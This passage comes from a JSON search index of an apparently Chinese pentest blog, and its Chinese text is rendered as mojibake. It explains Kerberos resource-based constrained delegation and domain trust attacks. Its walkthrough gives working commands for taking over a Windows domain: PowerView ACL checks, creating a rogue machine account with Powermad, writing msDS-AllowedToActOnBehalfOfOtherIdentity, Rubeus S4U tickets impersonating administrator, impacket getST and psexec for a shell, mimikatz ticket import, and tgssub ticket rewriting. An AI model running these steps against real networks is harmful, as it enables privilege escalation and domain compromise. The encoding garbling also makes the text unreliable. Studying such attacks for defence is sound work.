","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:3:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4 åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:4:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.1 åŸç† ä¸Šæ–‡çš„çº¦æŸå§”æ´¾ä¸­æåˆ°ï¼Œå¦‚æœé…ç½®å—çº¦æŸçš„å§”æ´¾ï¼Œå¿…é¡»æ‹¥æœ‰ SeEnableDelegation ç‰¹æƒï¼Œè¯¥ç‰¹æƒæ˜¯æ•æ„Ÿçš„ï¼Œé€šå¸¸ä»…æˆäºˆåŸŸç®¡ç†å‘˜ã€‚ä¸ºäº†ä½¿ç”¨æˆ·/èµ„æºæ›´åŠ ç‹¬ç«‹ï¼ŒWindows Server 2012 ä¸­å¼•å…¥äº†åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾(RBCD)é…ç½®åœ¨åç«¯ç›®æ ‡æœåŠ¡æˆ–èµ„æºä¸Š(ä¾‹å¦‚åç«¯çš„ CIFS æœåŠ¡)ï¼Œè€Œä¸æ˜¯åœ¨å‰ç«¯çš„æœåŠ¡æˆ–èµ„æºä¸Š(ä¾‹å¦‚å‰ç«¯çš„ WEB ç­‰)ã€‚åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å…è®¸èµ„æºé…ç½®å—ä¿¡ä»»çš„å¸æˆ·å§”æ´¾ç»™ä»–ä»¬ã€‚ åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å’Œä¼ ç»Ÿçš„çº¦æŸå§”æ´¾éå¸¸ç›¸ä¼¼ï¼Œä½†æ˜¯ä½œç”¨çš„æ–¹å‘å®é™…ä¸Šæ˜¯ç›¸åçš„ã€‚ ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾ï¼šåœ¨ ServiceA çš„ msDS-AllowedToDelegateTo å±æ€§ä¸­é…ç½®äº†å¯¹ ServiceB çš„ä¿¡ä»»å…³ç³»ï¼Œå®šä¹‰äº†åˆ° ServiceB çš„ä¼ å‡ºå§”æ´¾ä¿¡ä»»ã€‚ä¼ ç»Ÿçš„çº¦æŸå§”æ´¾ S4U2Self è¿”å›çš„ç¥¨æ®ä¸€å®šæ˜¯å¯è½¬å‘çš„ï¼Œå¦‚æœä¸å¯è½¬å‘é‚£ä¹ˆ S4U2Proxy å°†å¤±è´¥ï¼›ä½†æ˜¯åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾ä¸åŒï¼Œå°±ç®— S4U2Self è¿”å›çš„ç¥¨æ®ä¸å¯è½¬å‘ï¼ˆå¯ä¸å¯ä»¥è½¬å‘ç”± TrustedToAuthenticationForDelegation å†³å®šï¼‰ï¼ŒS4U2Proxy ä¹Ÿæ˜¯å¯ä»¥æˆåŠŸï¼Œå¹¶ä¸” S4U2Proxy è¿”å›çš„ç¥¨æ®æ€»æ˜¯å¯è½¬å‘ã€‚ èµ„æºçº¦æŸå§”æ´¾ï¼šåœ¨ ServiceB çš„ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§ä¸­é…ç½®äº†å¯¹ ServiceA çš„ä¿¡ä»»å…³ç³»ï¼Œå®šä¹‰äº†ä» ServiceA çš„ä¼ å…¥ä¿¡ä»»å…³ç³»ã€‚èµ„æºæœ¬èº«å¯ä»¥ä¸ºè‡ªå·±é…ç½®èµ„æºå§”æ´¾ä¿¡ä»»å…³ç³»ï¼Œèµ„æºæœ¬èº«å†³å®šå¯ä»¥ä¿¡ä»»è°ï¼Œè¯¥ä¿¡ä»»è°ã€‚ åˆ©ç”¨æ¡ä»¶ï¼šç®€å•æ¥è¯´å°±æ˜¯ä½ è·å¾—çš„ç”¨æˆ·å¯¹è¯¥ä¸»æœºçš„å±æ€§å…·æœ‰å†™æƒé™ï¼Œé‚£ä¹ˆè¿™ä¸ªç”¨æˆ·å°±å¯ä»¥å¯¹è¯¥ä¸»æœºè¿›è¡Œæ”»å‡»ã€‚ ç›¸ä¿¡æ­¤æ—¶å¤§å®¶åº”è¯¥æ˜ç™½äº†**åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾(RBCD)**çš„è®¤è¯æµç¨‹ã€‚æ€ä¹ˆæ¥è®¾ç½®åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å‘¢ï¼Ÿå…¶ä¸­ msDS-AllowedToActOnBehalfOfOtherIdentity æ˜¯å…³é”®ã€‚ é¦–å…ˆæˆ‘ä»¬æ¥æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼š**â€œè°æœ‰æƒé™èƒ½ä¿®æ”¹ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§çš„å€¼å‘¢?â€ ** åˆ†æç¯å¢ƒå¦‚ä¸‹ï¼š è§’è‰² ç”¨æˆ· ç³»ç»Ÿ åŸŸå†…æ™®é€šæœºå™¨ Redteam\\web3user Win 2012 åŸŸæ§æœºå™¨ Redteam\\administrator Win 2012 æŸ¥è¯¢ web3 çš„ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§å‘ç°é»˜è®¤æ˜¯ä¸å­˜åœ¨çš„ã€‚ ç”±æ­¤å¾—çŸ¥æ‰€æœ‰åŠ å…¥åŸŸçš„æœºå™¨é»˜è®¤ä¸å­˜åœ¨è¿™ä¸ªå±æ€§ï¼Œéœ€è¦æ‰‹åŠ¨æ·»åŠ æ‰è¡Œã€‚ é‚£ä¹ˆè°æœ‰æƒé™èƒ½ä¿®æ”¹ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§çš„å€¼çš„é—®é¢˜å°±å˜æˆäº†è°æœ‰æƒé™æ·»åŠ  msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§ã€‚ ç»è¿‡æŸ¥è¯¢ï¼Œä»¥ä¸‹ä¸¤ä¸ªç”¨æˆ·å…·æœ‰è¯¥æƒé™ï¼š REDTEAM\\web3user -\u003e WriteProperty NT AUTHORITY\\SELF -\u003e WriteProperty ä¸ºä»€ä¹ˆ REDTEAM\\web3user æ‹¥æœ‰ WriteProperty æƒé™å‘¢ï¼Ÿå½“ web3 è®¡ç®—æœºé€šè¿‡åŸŸç”¨æˆ· web3user åŠ å…¥åŸŸæ—¶ï¼ŒåŸŸå†…ä¼šåˆ›å»ºåä¸º web3.redteam.com çš„è®¡ç®—æœºå¯¹è±¡ï¼Œè€Œåˆ›å»ºè€…å°±æ˜¯ web3userï¼Œæ‰€ä»¥è¯¥åŸŸç”¨æˆ·å…·æœ‰å¯¹ web3.redteam.com çš„ WriteProperty æƒé™ã€‚ ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:4:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"4.2 å®æˆ˜ æ”»å‡»æµç¨‹ï¼š å‡è®¾å¼€å¯åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾æœºå™¨ä¸º A é¦–å…ˆè¦æœ‰ä¸€ä¸ªå¯¹å½“å‰è®¡ç®—æœºæœ‰å†™æƒé™çš„è´¦æˆ·ï¼Œæ‰èƒ½å¯¹ A è®¾ç½®å¯ä»¥è¢«å§”æ´¾è®¿é—®çš„æœåŠ¡è´¦æˆ·ã€‚ åˆ©ç”¨å½“å‰è´¦æˆ·åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¹¶é…ç½®å¥½æœºå™¨è´¦æˆ·åˆ° A çš„åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ å› ä¸ºæœºå™¨è´¦æˆ·æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ï¼Œæˆ‘ä»¬çŸ¥é“å®ƒçš„å¯†ç è´¦æˆ·ï¼Œå¯ä»¥è®©å®ƒåˆ©ç”¨ S4U2SELF åè®®è·å¾—ä¸€ä¸ªä¸å¯è½¬å‘ STã€‚ç„¶åç”¨è¿™ä¸ªä¸å¯è½¬å‘ ST é€šè¿‡ S4U2PROXYï¼Œåœ¨åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åŸºç¡€ä¸Šè·å¾—æœ‰æ•ˆçš„è®¿é—® A cifs æœåŠ¡çš„ ST2ã€‚ ç”¨ ST2 è®¿é—® A çš„ CIFS æœåŠ¡ï¼Œè·å¾—æƒé™ã€‚ 4.2.1 ç¯å¢ƒæ¨¡æ‹Ÿ é¦–å…ˆè¦æŸ¥æ‰¾åŸŸä¸­çš„æŸä¸ªåŸŸç”¨æˆ·å¯¹ç›®æ ‡æœºå™¨çš„å±æ€§æœ‰å†™æƒé™ï¼Œåœ¨æ­¤å¤„æ‰‹åŠ¨æ·»åŠ ä¸€ä¸ªç”¨æˆ·ï¼Œä»¥æ¨¡æ‹Ÿè¯¥æƒé™ï¼š ç›´æ¥åœ¨åŸŸæ§ä¸Šæ‰¾åˆ°æŸä¸»æœºï¼Œç„¶åè¿›å…¥åœ¨å±æ€§é‡Œè¿›å…¥å®‰å…¨é€‰é¡¹å¡ï¼Œæ·»åŠ æŸç”¨æˆ·ï¼Œç„¶åç»™è¿™ä¸ªç”¨æˆ·åˆ†é…æƒé™å³å¯ã€‚ 4.2.2 å¯»æ‰¾å¯¹ç›®æ ‡ä¸»æœºè´¦æˆ·æœ‰å®Œå…¨æ§åˆ¶æƒé™çš„ç”¨æˆ· åˆ©ç”¨ powerview æŸ¥çœ‹å½“å‰ç”¨æˆ· SIDï¼Œå¹¶æŸ¥çœ‹å½“å‰ç”¨æˆ·å¯¹æŸå°ä¸»æœºæ˜¯å¦æœ‰å†™æƒé™ # æŸ¥çœ‹ SID Get-DomainUser -Identity [userName] -Properties objectsid # æŸ¥çœ‹å†™æƒé™ Get-DomainObjectAcl -Identity [computerName] | ?{$_.SecurityIdentifier -match \"SID\"} å¦‚æœæœ‰ GenericAllï¼ˆå®Œå…¨æ§åˆ¶æƒï¼‰ï¼ŒGenericWriteã€WritePropertyã€WriteDacl è¿™äº›å±æ€§ï¼Œå°±è¯´æ˜è¯¥ç”¨æˆ·èƒ½ä¿®æ”¹è®¡ç®—æœºçš„è´¦æˆ·å±æ€§ã€‚ 4.2.3 åˆ›å»ºæœºå™¨è´¦å· ç°åœ¨è¿˜éœ€è¦çš„æ˜¯ä¸€ä¸ªå…·æœ‰ SPN çš„è´¦æˆ·ï¼Œå› ä¸º S4U2Self åªé€‚ç”¨äºå…·æœ‰ SPN çš„è´¦æˆ·ï¼Œæ°å¥½çš„æ˜¯åœ¨åŸŸä¸­æœ‰ä¸€ä¸ªå±æ€§ MachineAccountQuotaï¼Œè¿™ä¸ªå€¼è¡¨ç¤ºçš„æ˜¯å…è®¸ç”¨æˆ·åœ¨åŸŸä¸­åˆ›å»ºçš„è®¡ç®—æœºå¸æˆ·æ•°ï¼Œé»˜è®¤ä¸º 10ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¦‚æœæ‹¥æœ‰ä¸€ä¸ªæ™®é€šçš„åŸŸç”¨æˆ·é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªç”¨æˆ·æœ€å¤šå¯ä»¥åˆ›å»ºåä¸ªæ–°çš„è®¡ç®—æœºå¸æˆ·ï¼Œè€Œè®¡ç®—æœºè´¦æˆ·é»˜è®¤æ˜¯æ³¨å†Œ RestrictedKrbHost/domain å’Œ HOST/domain è¿™ä¸¤ä¸ª SPN çš„ï¼Œæ‰€ä»¥è¿™é‡Œåˆšå¥½ç¬¦åˆæˆ‘ä»¬çš„æ„å›¾ã€‚ å¯ä»¥ä½¿ç”¨ Powermad ä¸­çš„ New-MachineAccount æ¥åˆ›å»ºä¸€ä¸ªç”¨æˆ·åä¸º evilsystemï¼Œå¯†ç ä¸º evil çš„è®¡ç®—æœºè´¦æˆ· https://github.com/Kevin-Robertson/Powermad Import-Module .\\Powermad.ps1 New-MachineAccount -MachineAccount evilsystem -Password $(ConvertTo-SecureString \"testObject\" -AsPlainText -Force) æ·»åŠ äº†ä¸€ä¸ªå¯†ç  testObjectï¼Œåä¸º hacksystem çš„æœºå™¨è´¦æˆ·ï¼Œæ¥ä¸‹æ¥å°±æ˜¯é…ç½® hacksystem åˆ° WIN7 çš„å§”æ´¾äº†ã€‚æˆ‘ä»¬éœ€è¦åšçš„ï¼Œæ˜¯ä¿®æ”¹ WIN7 çš„ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§çš„å€¼ ï¼Œè¿™ä¸ªæ“ä½œæˆ‘ä»¬ç”¨ powerview å®ç°ã€‚ # è¿™é‡Œçš„ sid -\u003e S-1-5-21-3298638106-3321833000-1571791979-1112 # æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ æœºå™¨ç”¨æˆ· evilsystem çš„ sidï¼Œåœ¨ powerview ä¸‹ç”¨ Get-Domiancomputer hacksystem # è·å– $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3298638106-3321833000-1571791979-1112)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer [ç›®æ ‡ä¸»æœºå]| Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose éªŒè¯æ˜¯å¦æˆåŠŸæ·»åŠ ï¼š Get-DomainComputer WIN7 -Properties msds-allowedtoactonbehalfofotheridentity é…ç½®å®Œ msDS-AllowedToActOnBehalfOfOtherIdentity å±æ€§ä¹‹åå°±å¯ä»¥é€šè¿‡åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾å»æ”»å‡»ç›®æ ‡ä¸»æœºäº† 4.2.4 æ”»å‡» æ”»å‡»è·¯å¾„ï¼šuser -\u003e evil -\u003e target æœ¬åœ°å¯¼å‡ºæœºå™¨ç”¨æˆ·çš„ ntlm hashï¼š Rubeus.exe hash /user:evilsystem /password:testObject /domain:xxx ç„¶åç”¨ evilsystem$ çš„ hash è¯·æ±‚ç™½é“¶ç¥¨æ®å¹¶å¯¼å…¥åˆ°å½“å‰ä¼šè¯ä¸­ï¼š Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:cifs/dc /ptt Rubeus.exe s4u /user:evilsystem$ /rc4:xxx /impersonateuser:administrator /msdsspn:host/dc /ptt 4.2.5 æ³¨æ„äº‹é¡¹ Rubeus ç”³è¯·çš„ç¥¨æ®å’Œ impacket ç”³è¯·çš„ç¼“å­˜ç¥¨æ®æœ‰å·®åˆ«ï¼Œæµ‹è¯•æ—¶ä½¿ç”¨ Psexec è¿”å›ä¸€ä¸ª shell å¤±è´¥ï¼Œéœ€è¦å†ç”³è¯·ä¸€ä¸ª HOST ç¥¨æ®ã€‚ impacket getST.py -dc-ip IP -spn cifs/target -impersonate administrator pentest.com/evilsystem$:evil set KRB5CCNAME=administrator.ccache python psexec.py -nopass -k target # æˆ–è€…åˆ©ç”¨ mimikatz å¯¼å…¥ç¥¨æ® mimikatz.exe \"privilege::debug\" \"kerberos::ptc administrator.ccache\" Psexec.exe \\\\target -s cmd 4.2.6 è§£å†³æ•æ„Ÿè´¦æˆ·ä¸èƒ½å§”æ´¾ åˆ©ç”¨æ¡ä»¶ï¼šçŸ¥é“ç›®æ ‡çš„ä¸»æœºè´¦æˆ·çš„å‡­è¯ æ³¨ï¼š ä¸€èˆ¬æƒ…å†µä¸‹ä¸»æœºåœ¨åŠ å…¥åŸŸä¸­ä¼šéšæœºè®¾ç½®ä¸»æœºè´¦æˆ·çš„å¯†ç ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ç”¨çš„æ˜¯ä¸»æœºè´¦æˆ· hashï¼Œå¹¶ä¸”ä¸èƒ½ä¿®æ”¹ä¸»æœºè´¦æˆ·çš„å¯†ç ï¼Œå¦åˆ™è¯¥ä¸»æœºå°±ä¼šå’ŒåŸŸå¤±å»ä¿¡ä»»ã€‚ åœ¨åŸŸç¯å¢ƒä¸­ï¼Œé«˜æƒé™ç”¨æˆ·å¦‚æœæ²¡æœ‰ç‰¹æ®Šéœ€æ±‚çš„æƒ…å†µä¸‹ï¼Œè€ƒè™‘åˆ°å®‰å…¨æ€§ä¸€èˆ¬æ˜¯è®¾ç½®ä¸ºä¸å¯å§”æ´¾ï¼Œæˆ–è€…æ˜¯åŠ å…¥å—ä¿æŠ¤ç»„ åœ¨ä»¥ administrator è´¦æˆ·èº«ä»½è¿›è¡Œ S4U æ—¶ï¼Œåªèƒ½è¿›è¡Œ S4U2SELFï¼Œä¸èƒ½è¿›è¡ŒS4U2PROXYã€‚ ç”¨ Rubeus.exe s4u /user:evilsystem$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /impersonateuser:administrator /msdsspn:cifs/target /pttç»§ç»­å®éªŒ administratorï¼Œå‘ç°ç¡®å®æ˜¯è¿™æ · è§£å¯† base64 åçš„ç¥¨æ®ï¼š rubeus.exe describe /ticker:S4Ubase64 doIFxxxxxxx å‘ç° SPN å¹¶æ²¡æœ‰æŒ‡å®šæœåŠ¡ åˆ©ç”¨ Rubeus å®Œæˆç¥¨æ®ä¿®æ”¹ï¼š rubeus.exe tgssub /ticket:base64EncodeTicket /altservice:cifs/test1 /ptt ä¿®æ”¹åå¯¼å…¥å†…å­˜å³å¯ã€‚ å‚è€ƒï¼š http://www.const27.com/2020/10/12/åŸŸå§”æ´¾æ”»å‡»/ https://eviladan0s.github.io/2020/04/14/kerberos-delegation/ https://xz.aliyun.com/t/7217 https://docs.microsoft.com/zh-cn/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/jj553400(v=ws.11) https://daiker.gitbook.io/windows-protocol/kerberos/2#0x05-wei-pai https://blog.ateam.qianxin.com/post/wei-ruan-bu-ren-de-0day-zhi-yu-nei-ben-di-ti-quan-lan-fan-qie ","date":"2020-05-06","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/:4:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸå§”æ´¾"],"title":"åŸºäºåŸŸå§”æ´¾çš„æ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»åŸç†åŠå®éªŒ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡» ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:0:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"åŸŸä¿¡ä»» å»ºç«‹åŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»ï¼Œæ˜¯ä¸ºäº†ä¸€ä¸ªåŸŸçš„ç”¨æˆ·èƒ½æ–¹ä¾¿åœ°è®¿é—®å…¶ä»–åŸŸçš„èµ„æºï¼ŒåŒæ—¶ä¹Ÿæ–¹ä¾¿äº†å¯¹åŸŸç½‘ç»œçš„ç®¡ç†å’Œç»´æŠ¤ã€‚è¿™ç§æ¨¡å¼åœ¨å¸¦æ¥ä¾¿åˆ©çš„åŒæ—¶ï¼Œä¹Ÿå­˜åœ¨å¾ˆå¤šå¯ä»¥è¢«æ¶æ„æ”»å‡»è€…åˆ©ç”¨çš„åœ°æ–¹ã€‚ åŸŸä¿¡ä»»å…³ç³»å¯ä»¥æ˜¯å•å‘\\åŒå‘ä¿¡ä»»ã€å¯ä¼ é€’\\ä¸å¯ä¼ é€’ä¿¡ä»»ã€å†…éƒ¨\\å¤–éƒ¨ä¿¡ä»»ã€è·¨åŸŸé“¾æ¥ä¿¡ä»»(cross link trust)ç­‰ç±»å‹ã€‚ä¾‹å¦‚ï¼Œ2 ä¸ªåŸŸä¹‹é—´æœ‰å•å‘å¯ä¼ é€’çš„å¤–éƒ¨ä¿¡ä»»å…³ç³»ã€‚åŒä¸€ä¸ªæ£®æ—(Forest)å†…éƒ¨çš„åŸŸä¿¡ä»»å…³ç³»ï¼Œä¸€èˆ¬éšå«ä¸ºåŒå‘å¯ä¼ é€’çš„å†…éƒ¨ä¿¡ä»»å…³ç³»ã€‚ éƒ¨ç½²ï¼š çˆ¶å­ä¿¡ä»»å…³ç³»æ˜¯æœ€å¸¸è§çš„åŸŸä¿¡ä»»å…³ç³»ï¼Œåœ¨åŒä¸€ä¸ªæ£®æ—å†…éƒ¨ï¼ŒåŠ å…¥ä¸€ä¸ªæ–°åŸŸæ—¶ï¼Œæœ€å¸¸è§çš„æ˜¯å­åŸŸæ¨¡å¼(Parent- Child)ï¼Œæˆ–è€…æ˜¯æ ‘æ ¹æ¨¡å¼(Tree-Root)ï¼Œè¿™ä¸¤ç§æ¨¡å¼åˆ†åˆ«ä¼šå»ºç«‹çˆ¶å­ä¿¡ä»»\\æ ‘æ ¹ä¿¡ä»»å…³ç³»ï¼Œéƒ½æ˜¯åŒå‘å¯ä¼ é€’çš„å†…éƒ¨ä¿¡ä»»å…³ç³»ã€‚ è·¨åŸŸé“¾æ¥ä¿¡ä»»(cross link)ï¼ŒæŒ‡çš„æ˜¯åœ¨åŒä¸€ä¸ªæ£®æ—çš„ä¸¤ä¸ªå­åŸŸé—´å»ºç«‹ç›´æ¥çš„ä¿¡ä»»å…³ç³»ã€‚å› ä¸ºåœ¨åŒä¸€ä¸ªæ£®æ—ä¸­ï¼ŒåŸŸçš„ç»„ç»‡å…³ç³»æ˜¯æ ‘çŠ¶ç»“æ„ï¼Œä»ä¸€ä¸ªå­åŸŸåˆ°å¦å¤–ä¸€ä¸ªåŸŸï¼Œéœ€è¦ä»æ ‘æçš„å­åŸŸé¡ºå¯»åˆ°æ ¹åŸŸ(Forest Root)ï¼Œç„¶åä»æ ¹åŸŸç»§ç»­é¡ºå¯»åˆ°å¦å¤–ä¸€ä¸ªå­åŸŸï¼Œè€Œè·¨åŸŸé“¾æ¥ç›¸å½“äº åœ¨ 2 ä¸ªå­åŸŸä¹‹é—´ä¹‹é—´å»ºç«‹äº†ä¸€ä¸ªå¿«æ·æ–¹å¼çš„ä¿¡ä»»å…³ç³»ï¼Œä»¥å‡å°‘è®¤è¯å’Œæˆæƒçš„æ—¶é—´å’Œæ­¥éª¤ã€‚ å†…éƒ¨ä¿¡ä»»æŒ‡çš„æ˜¯æ£®æ—å†…éƒ¨åŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»ã€‚ç›¸åº”åœ°ï¼Œå¤–éƒ¨ä¿¡ä»»(External Domain Trust)æŒ‡çš„æ˜¯åŸŸå’Œæ‰€åœ¨æ£®æ—ä¹‹å¤–çš„åŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»ã€‚ è¿˜æœ‰ä¸€ç§ MIT ä¿¡ä»»(Kerberos åè®®åŠæ ‡å‡†ç”± MIT æå‡º)ï¼Œæ˜¯ Windows åŸŸä¸é Windows åŸŸä¹‹é—´çš„ä¿¡ä»»å…³ç³»ï¼Œç”±äºåº”ç”¨è¾ƒå°‘ï¼Œæœ¬æ–‡ä¸è®¨è®ºæ­¤ç§ç±»å‹çš„åŸŸä¿¡ä»»å…³ç³»ã€‚ ","date":"2020-05-05","objectID":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/:1:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","åŸŸä¿¡ä»»å…³ç³»"],"title":"åŸºäºåŸŸä¿¡ä»»å…³ç³»çš„åŸŸæ”»å‡»","uri":"/2020/05/%E5%9F%BA%E4%BA%8E%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%85%B3%E7%B3%BB%E7%9A%84%E5%9F%9F%E6%94%BB%E5%87%BB/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"è·¨åŸŸè®¤è¯å’Œèµ„æºè®¿é—®æˆæƒ å½“ 2 ä¸ªåŸŸä¹‹é—´å»ºç«‹åŸŸä¿¡ä»»å…³ç³»æ—¶ï¼Œä¼šå»ºç«‹å…±äº«çš„åŸŸé—´å¯†é’¥(Inter-Realm Keyï¼Œç®€å†™ä¸ºIRKey)ï¼Œå…¶ä½œç”¨ç›¸å½“äº Krbtgtï¼Œåªä¸è¿‡ IRKey ç”¨äºç›¸äº’ä¿¡ä»»çš„ 2 ä¸ªåŸŸä¹‹é—´çš„è®¤ è¯ï¼Œè€Œ Krbtgt ç”¨äºåŒä¸€ä¸ªåŸŸæœåŠ¡å™¨çš„ AC å’Œ KDC ä¹‹é—´çš„è®¤è¯ã€‚ ä¿¡ä»»åŸŸä¹‹é—´çš„è®¤è¯æˆæƒè¿‡ç¨‹ï¼Œä¸åŒä¸€ä¸ªåŸŸä¸­çš„è®¤è¯æˆæƒå¤§æŠµç›¸ä¼¼ï¼Œä½†ä»ç„¶æœ‰ä¸å°‘åŒºåˆ«ã€‚ Jack å‘ DC1 å‘èµ·è®¤è¯è¯·æ±‚ï¼Œæ•°æ®ç”± Jack çš„å£ä»¤ NTLM å€¼åŠ å¯†; DC1 ä½¿ç”¨ Jack çš„å£ä»¤ NTLM å€¼éªŒè¯æ”¶åˆ°çš„è®¤è¯è¯·æ±‚ï¼Œè¿”å›ä¸€ä¸ªé€šè¿‡è®¤è¯çš„ TGT ç¥¨æ®ç»™ Jack; Jack ä½¿ç”¨ TGT ç¥¨æ®ï¼Œå‘ DC1 å‘èµ·æˆæƒè¯·æ±‚ï¼Œå‘èµ· è¯·æ±‚è®¿é—® DC2 ä¸­æ–‡ä»¶æœåŠ¡çš„ TGS_REQ; DC1 æ£€æŸ¥åˆ°æ–‡ä»¶æœåŠ¡åœ¨ DC2 ä¸­ï¼Œè¿”å›ä¸€ä¸ªå¯è½¬æŠ•çš„ TGT(Referral TGT)ï¼ŒæŒ‡æ˜éœ€è½¬æŠ•åˆ° DC2ï¼Œä½¿ç”¨ IRKey åŠ å¯†å¯è½¬æŠ• TGT ä¸­çš„è®¤è¯ä¿¡æ¯; Jack æ”¶åˆ°å¯è½¬æŠ•çš„ TGT åï¼Œæ ¹æ®æç¤ºä¿¡æ¯ï¼Œä½¿ç”¨è½¬æŠ• TGTï¼Œå‘èµ·è®¿é—® DC2 ä¸­æ–‡ä»¶æœåŠ¡çš„è¯·æ±‚ TGS_REQ; DC2 æ”¶åˆ°è¯·æ±‚åï¼Œä½¿ç”¨ IRKey éªŒè¯å¯è½¬æŠ• TGT ä¸­çš„è®¤è¯ä¿¡æ¯ï¼Œè¿”å›ä¸€ä¸ªå…è®¸è®¿é—®æ–‡ä»¶æœåŠ¡çš„ TGS 